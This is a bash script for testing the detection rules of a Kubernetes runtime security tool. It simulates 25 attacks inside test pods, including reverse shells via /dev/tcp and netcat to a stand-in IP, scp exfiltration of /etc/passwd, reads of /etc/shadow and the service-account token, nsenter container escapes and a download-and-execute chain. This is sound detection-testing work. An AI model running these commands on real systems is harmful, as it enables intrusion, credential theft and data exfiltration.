#!/usr/bin/env bash
# ============================================================
#  KubeRTSec — Attack Simulation & Testing Script
#  Tests all detection rules with real attack patterns
#
#  Usage: bash attack-test.sh
#  Options:
#    --namespace <ns>   Target namespace (default: test-workloads)
#    --skip-setup       Skip pod creation (use existing)
#    --cleanup          Remove test pods after simulation
# ============================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
MAGENTA='\033[0;35m'

info()    { echo -e "${CYAN}[INFO]${NC}    $*"; }
success() { echo -e "${GREEN}[✓]${NC}      $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}   $*"; }
attack()  { echo -e "${RED}[ATTACK]${NC}  $*"; }
step()    { echo -e "\n${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; \
            echo -e "${BOLD}${MAGENTA}  $*${NC}"; \
            echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }
result()  { echo -e "${BOLD}${BLUE}[RESULT]${NC}  $*"; }

# ── Defaults ──────────────────────────────────────────────────
NS="test-workloads"
SKIP_SETUP=false
CLEANUP=false
TOTAL_ATTACKS=0
TRIGGERED=0

while [[ $# -gt 0 ]]; do
  case $1 in
    --namespace)   NS="$2"; shift 2 ;;
    --skip-setup)  SKIP_SETUP=true; shift ;;
    --cleanup)     CLEANUP=true; shift ;;
    -h|--help)
      echo "Usage: $0 [--namespace <ns>] [--skip-setup] [--cleanup]"
      exit 0 ;;
    *) shift ;;
  esac
done

echo -e "${RED}${BOLD}"
cat << 'BANNER'
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ████████╗███████╗███████╗ ██████╗
██║ ██╔╝██║   ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝██╔════╝
█████╔╝ ██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ███████╗█████╗  ██║
██╔═██╗ ██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ╚════██║██╔══╝  ██║
██║  ██╗╚██████╔╝██████╔╝███████╗██║  ██║   ██║   ███████║███████╗╚██████╗
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝
                    Attack Simulation & Testing Suite
BANNER
echo -e "${NC}"

echo -e "${YELLOW}${BOLD}⚠  WARNING: This script simulates real attacks inside Kubernetes pods.${NC}"
echo -e "${YELLOW}   KubeRTSec will detect and may kill some processes — that is expected!${NC}"
echo -e "${YELLOW}   Run this ONLY on a test cluster, never on production workloads.${NC}"
echo ""
echo -e "Target namespace: ${BOLD}${NS}${NC}"
echo ""
read -r -p "Continue? (y/N): " confirm
[[ "$confirm" =~ ^[Yy]$ ]] || { echo "Aborted."; exit 0; }

# ── Helper: run command in pod ─────────────────────────────────
exec_pod() {
  local pod="$1"
  local cmd="$2"
  kubectl exec -n "$NS" "$pod" -- sh -c "$cmd" 2>/dev/null || true
}

# ── Helper: track attack ───────────────────────────────────────
do_attack() {
  local name="$1"
  local pod="$2"
  local cmd="$3"
  local expect="$4"

  TOTAL_ATTACKS=$((TOTAL_ATTACKS + 1))
  attack "[$TOTAL_ATTACKS] $name"
  info "Pod: $pod"
  info "Command: $cmd"
  exec_pod "$pod" "$cmd"
  result "Expected alert: ${expect}"
  echo ""
  sleep 2
}

# ══════════════════════════════════════════════════════════════
# STEP 1: Setup Test Pods
# ══════════════════════════════════════════════════════════════
if [[ "$SKIP_SETUP" == "false" ]]; then
  step "STEP 1: Deploying Test Pods"

  # Create namespace
  if kubectl get namespace "$NS" &>/dev/null 2>&1; then
    info "Namespace '$NS' already exists"
  else
    kubectl create namespace "$NS"
    success "Created namespace: $NS"
  fi

  # Deploy pods
  kubectl run nginx-pod \
    --image=nginx:latest \
    --namespace="$NS" \
    --restart=Never \
    2>/dev/null || info "nginx-pod already exists"

  kubectl run ubuntu-pod \
    --image=ubuntu:latest \
    --namespace="$NS" \
    --restart=Never \
    --command -- sleep infinity \
    2>/dev/null || info "ubuntu-pod already exists"

  kubectl run alpine-pod \
    --image=alpine:latest \
    --namespace="$NS" \
    --restart=Never \
    --command -- sleep infinity \
    2>/dev/null || info "alpine-pod already exists"

  # Wait for pods to be running
  info "Waiting for pods to be Running..."
  kubectl wait --for=condition=ready pod/nginx-pod   -n "$NS" --timeout=120s 2>/dev/null && success "nginx-pod ready"   || warn "nginx-pod not ready"
  kubectl wait --for=condition=ready pod/ubuntu-pod  -n "$NS" --timeout=120s 2>/dev/null && success "ubuntu-pod ready"  || warn "ubuntu-pod not ready"
  kubectl wait --for=condition=ready pod/alpine-pod  -n "$NS" --timeout=120s 2>/dev/null && success "alpine-pod ready"  || warn "alpine-pod not ready"

  echo ""
  kubectl get pods -n "$NS"
  echo ""
  success "All test pods deployed!"
fi

echo ""
echo -e "${BOLD}${RED}🚨 ATTACK SIMULATION STARTING — Watch KubeRTSec dashboard!${NC}"
echo -e "${CYAN}   Open: http://localhost:3000 → Live Alerts tab${NC}"
echo ""
sleep 3

# ══════════════════════════════════════════════════════════════
# STEP 2: External Downloads (curl / wget)
# ══════════════════════════════════════════════════════════════
step "ATTACK 1 & 2: External Downloads (curl + wget)"

do_attack \
  "Malicious download via curl" \
  "alpine-pod" \
  "curl -s http://example.com -o /tmp/payload 2>/dev/null || true" \
  "suspicious_download_curl → HIGH"

do_attack \
  "Malicious download via wget" \
  "alpine-pod" \
  "wget -q http://example.com -O /tmp/payload2 2>/dev/null || true" \
  "suspicious_download_wget → HIGH"

# ══════════════════════════════════════════════════════════════
# STEP 3: Reverse Shell Patterns
# ══════════════════════════════════════════════════════════════
step "ATTACK 3 & 4: Reverse Shell Attempts"

do_attack \
  "Reverse shell via bash -i" \
  "ubuntu-pod" \
  "bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' 2>/dev/null || true" \
  "reverse_shell_bash → HIGH + Possible reverse shell"

do_attack \
  "Netcat reverse shell" \
  "alpine-pod" \
  "nc -e /bin/sh 1.2.3.4 4444 2>/dev/null || true" \
  "reverse_shell_nc → CRITICAL → process killed"

# ══════════════════════════════════════════════════════════════
# STEP 4: Crypto Miner Simulation
# ══════════════════════════════════════════════════════════════
step "ATTACK 5: Crypto Miner Execution"

do_attack \
  "XMRig crypto miner simulation" \
  "alpine-pod" \
  "cp /bin/sh /tmp/xmrig && /tmp/xmrig -c /dev/null 2>/dev/null || true" \
  "crypto_miner_xmrig → CRITICAL → process killed"

do_attack \
  "Generic miner binary" \
  "ubuntu-pod" \
  "cp /bin/sh /tmp/minerd && /tmp/minerd 2>/dev/null || true" \
  "crypto_miner_minerd → CRITICAL → process killed"

# ══════════════════════════════════════════════════════════════
# STEP 5: Sensitive File Access
# ══════════════════════════════════════════════════════════════
step "ATTACK 6, 7 & 8: Sensitive File Access"

do_attack \
  "Read /etc/shadow (password hashes)" \
  "alpine-pod" \
  "cat /etc/shadow 2>/dev/null || true" \
  "sensitive_file_access → CRITICAL → process killed"

do_attack \
  "Read /etc/passwd" \
  "alpine-pod" \
  "cat /etc/passwd 2>/dev/null || true" \
  "sensitive_file_access → CRITICAL"

do_attack \
  "Access SSH keys" \
  "ubuntu-pod" \
  "ls /root/.ssh/ 2>/dev/null || true" \
  "sensitive_file_access /root/.ssh → CRITICAL"

# ══════════════════════════════════════════════════════════════
# STEP 6: Privilege Escalation
# ══════════════════════════════════════════════════════════════
step "ATTACK 9, 10 & 11: Privilege Escalation"

do_attack \
  "sudo privilege escalation" \
  "ubuntu-pod" \
  "sudo id 2>/dev/null || true" \
  "privilege_escalation_sudo → HIGH"

do_attack \
  "chmod suspicious file" \
  "alpine-pod" \
  "chmod +x /tmp/payload 2>/dev/null || true" \
  "suspicious_chmod → HIGH"

do_attack \
  "chown file ownership change" \
  "alpine-pod" \
  "chown root /tmp/payload 2>/dev/null || true" \
  "suspicious_chown → HIGH"

# ══════════════════════════════════════════════════════════════
# STEP 7: Execution from /tmp (Malware Pattern)
# ══════════════════════════════════════════════════════════════
step "ATTACK 12 & 13: Execution from Temp Directories"

do_attack \
  "Execute binary from /tmp (malware pattern)" \
  "alpine-pod" \
  "cp /bin/sh /tmp/evil && chmod +x /tmp/evil && /tmp/evil -c 'id' 2>/dev/null || true" \
  "suspicious_tmp_execution → HIGH"

do_attack \
  "Execute from /dev/shm (memory-only malware)" \
  "ubuntu-pod" \
  "cp /bin/sh /dev/shm/hidden && chmod +x /dev/shm/hidden && /dev/shm/hidden -c 'whoami' 2>/dev/null || true" \
  "suspicious_tmp_execution /dev/shm → HIGH"

# ══════════════════════════════════════════════════════════════
# STEP 8: Container Escape Attempts
# ══════════════════════════════════════════════════════════════
step "ATTACK 14, 15 & 16: Container Escape Attempts"

do_attack \
  "Mount syscall (container escape)" \
  "ubuntu-pod" \
  "mount 2>/dev/null || true" \
  "container_escape_mount → CRITICAL → process killed"

do_attack \
  "nsenter namespace escape" \
  "ubuntu-pod" \
  "nsenter --target 1 --mount --uts --ipc --net --pid -- sh 2>/dev/null || true" \
  "container_escape_nsenter → CRITICAL → process killed"

do_attack \
  "unshare namespace isolation bypass" \
  "alpine-pod" \
  "unshare --pid --fork sh 2>/dev/null || true" \
  "container_escape_unshare → CRITICAL → process killed"

# ══════════════════════════════════════════════════════════════
# STEP 9: Kubernetes Token Steal
# ══════════════════════════════════════════════════════════════
step "ATTACK 17 & 18: Kubernetes Credential Access"

do_attack \
  "Read Kubernetes service account token" \
  "alpine-pod" \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true" \
  "k8s_token_access → CRITICAL"

do_attack \
  "Access Kubernetes API with stolen token" \
  "alpine-pod" \
  "TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H \"Authorization: Bearer \$TOKEN\" https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null || true" \
  "k8s_token_access + network_connect → CRITICAL"

# ══════════════════════════════════════════════════════════════
# STEP 10: Network Reconnaissance
# ══════════════════════════════════════════════════════════════
step "ATTACK 19 & 20: Network Reconnaissance"

do_attack \
  "nmap network scan" \
  "ubuntu-pod" \
  "nmap -sn 10.0.0.0/24 2>/dev/null || true" \
  "network_recon_nmap → MEDIUM/HIGH"

do_attack \
  "netstat network inspection" \
  "ubuntu-pod" \
  "netstat -an 2>/dev/null || true" \
  "network_recon_netstat → LOW"

# ══════════════════════════════════════════════════════════════
# STEP 11: Data Exfiltration Tools
# ══════════════════════════════════════════════════════════════
step "ATTACK 21: Data Exfiltration"

do_attack \
  "SCP data exfiltration attempt" \
  "ubuntu-pod" \
  "scp /etc/passwd user@1.2.3.4:/tmp/ 2>/dev/null || true" \
  "data_exfiltration scp → HIGH"

# ══════════════════════════════════════════════════════════════
# STEP 12: Multi-Step Attack Chain (Download → chmod → Execute)
# ══════════════════════════════════════════════════════════════
step "ATTACK 22: MALWARE CHAIN (Download → chmod → Execute)"

echo -e "${RED}${BOLD}  This simulates a complete malware infection chain!${NC}"
echo -e "${RED}  KubeRTSec behavior engine should detect this pattern.${NC}"
echo ""

attack "[22a] Step 1 — Download payload"
exec_pod "alpine-pod" "wget -q http://example.com -O /tmp/malware 2>/dev/null || curl -s http://example.com -o /tmp/malware 2>/dev/null || true"
sleep 2

attack "[22b] Step 2 — Make executable"
exec_pod "alpine-pod" "chmod +x /tmp/malware 2>/dev/null || true"
sleep 2

attack "[22c] Step 3 — Execute"
exec_pod "alpine-pod" "/tmp/malware 2>/dev/null || sh /tmp/malware 2>/dev/null || true"
sleep 2

TOTAL_ATTACKS=$((TOTAL_ATTACKS + 1))
result "Expected: 🚨 MALWARE EXECUTION DETECTED — behavior chain triggered!"
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 13: Docker Socket Access (if mounted)
# ══════════════════════════════════════════════════════════════
step "ATTACK 23: Docker Socket / Host Access"

do_attack \
  "Access docker.sock" \
  "alpine-pod" \
  "ls /var/run/docker.sock 2>/dev/null || cat /var/run/docker.sock 2>/dev/null || true" \
  "container_escape docker.sock → CRITICAL"

do_attack \
  "Host filesystem access via /proc/1/root" \
  "alpine-pod" \
  "ls /proc/1/root 2>/dev/null || true" \
  "host_filesystem_access → HIGH"

# ══════════════════════════════════════════════════════════════
# STEP 14: Interactive Shell (suspicious inside container)
# ══════════════════════════════════════════════════════════════
step "ATTACK 24 & 25: Interactive Shell Detection"

do_attack \
  "Interactive bash shell" \
  "ubuntu-pod" \
  "bash -c 'echo test' 2>/dev/null || true" \
  "Interactive shell inside container → HIGH"

do_attack \
  "kubectl exec simulation" \
  "alpine-pod" \
  "sh -c 'echo kubectl_exec_simulation' 2>/dev/null || true" \
  "kubectl_exec_inside_node → MEDIUM"

# ══════════════════════════════════════════════════════════════
# RESULTS SUMMARY
# ══════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${GREEN}║              Attack Simulation Complete! 🎯                  ║${NC}"
echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${CYAN}Total attacks simulated${NC}  → ${BOLD}${TOTAL_ATTACKS}${NC}"
echo -e "  ${CYAN}Target namespace${NC}          → ${BOLD}${NS}${NC}"
echo ""
echo -e "${BOLD}Expected alerts in KubeRTSec dashboard:${NC}"
echo ""
echo -e "  ${RED}CRITICAL${NC}  → container escape, crypto miner, k8s token, reverse shell"
echo -e "  ${YELLOW}HIGH${NC}      → curl/wget download, bash shell, chmod, tmp execution"
echo -e "  ${CYAN}MEDIUM${NC}    → nmap scan, kubectl exec"
echo -e "  ${BLUE}LOW${NC}       → netstat"
echo ""
echo -e "${BOLD}Check results:${NC}"
echo -e "  Dashboard  → ${BOLD}http://localhost:3000${NC}  (Live Alerts tab)"
echo -e "  Timeline   → ${BOLD}http://localhost:3000${NC}  (Attack Timeline tab)"
echo -e "  Grafana    → ${BOLD}http://localhost:3001${NC}"
echo ""

# ── Check alerts via API ──────────────────────────────────────
ALERT_COUNT=$(curl -s "http://localhost:8080/api/alerts" 2>/dev/null | \
  python3 -c "
import sys, json
try:
  d = json.load(sys.stdin)
  alerts = d if isinstance(d, list) else d.get('alerts', [])
  print(len(alerts))
except: print('?')
" 2>/dev/null || echo "?")

echo -e "  Alerts detected by KubeRTSec → ${BOLD}${RED}${ALERT_COUNT}${NC}"
echo ""

# ── Optional cleanup ─────────────────────────────────────────
if [[ "$CLEANUP" == "true" ]]; then
  echo -e "${YELLOW}Cleaning up test pods...${NC}"
  kubectl delete namespace "$NS" --timeout=60s 2>/dev/null && success "Test namespace deleted" || true
fi

echo -e "${CYAN}Tip: Run ${BOLD}make status${NC}${CYAN} to see pod health after attacks.${NC}"
echo ""
